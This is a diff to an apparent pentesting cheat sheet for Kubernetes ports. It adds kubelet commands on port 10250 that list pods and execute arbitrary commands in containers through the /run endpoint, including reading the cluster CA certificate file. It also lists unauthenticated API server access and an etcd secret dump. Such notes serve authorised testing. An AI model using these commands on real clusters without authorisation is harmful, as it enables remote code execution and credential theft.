@@ -53,7 +53,7 @@ _/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\
 ------------------------------------------------------------------------------------------------------------------------------------
 
 443, 6443, 8443 - Kubernetes API server
-      - kubectl --namespace=default --insecure-skip-tls-verify --username=system:unauthenticated -shttp://[IP]:[PORT] <COMMAND>
+      - kubectl --namespace=default --insecure-skip-tls-verify --username=system:unauthenticated -shttp://[IP]:[PORT] [COMMAND]
       - COMMANDS:
          - version
          - auth can-i --list
@@ -64,6 +64,13 @@ _/ ___\ |  |  \ _/ __ \ \__  \ \   __\     /  ___/|  |  \ _/ __ \_/ __ \\   __\
       - curl -k https://[IP]:[PORT]
          - try /version
          - try /endpoints
+
+10250 - kubelet
+      - curl -k https://[CLUSTERIP]:10250/pods/ | jq
+      - curl https://[CLUSTERIP]:10250/run/[NAMESPACE]/[POD]/[CONTAINER] -k -XPOST -d "cmd=[COMMAND]"
+      - COMMANDS:
+         - ls
+         - cat /etc/kubernetes/pki/ca.cert
       
 2379 - etcd client
       - DUMP SECRETS
